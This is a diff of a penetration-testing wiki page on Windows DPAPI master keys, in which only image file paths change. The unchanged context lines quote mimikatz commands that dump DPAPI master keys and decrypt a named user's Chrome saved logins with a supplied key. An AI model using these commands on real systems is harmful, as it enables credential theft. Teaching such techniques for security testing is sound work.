@@ -102,7 +102,7 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 
 This is what a bunch of Master Keys of a user will looks like:
 
-![](<../../.gitbook/assets/image (324) (1).png>)
+![](<../../.gitbook/assets/image (324).png>)
 
 Usually **each master keys is an encrypted symmetric key that can decrypt other content**. Therefore, **extracting** the **encrypted Master Key** is interesting in order to **decrypt** later that **other content** encrypted with it.
 
@@ -140,7 +140,7 @@ If you are administrator you can obtain the dpapi master keys using:
 sekurlsa::dpapi
 ```
 
-![](<../../.gitbook/assets/image (326) (1).png>)
+![](<../../.gitbook/assets/image (326).png>)
 
 ### Extract all backup Master Keys with Domain Admin
 
@@ -164,7 +164,7 @@ We can now decrypt user's `spotless` chrome secrets using their decrypted master
 dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
 ```
 
-![](<../../.gitbook/assets/image (329) (1).png>)
+![](<../../.gitbook/assets/image (329).png>)
 
 ## Encrypting and Decrypting content
 
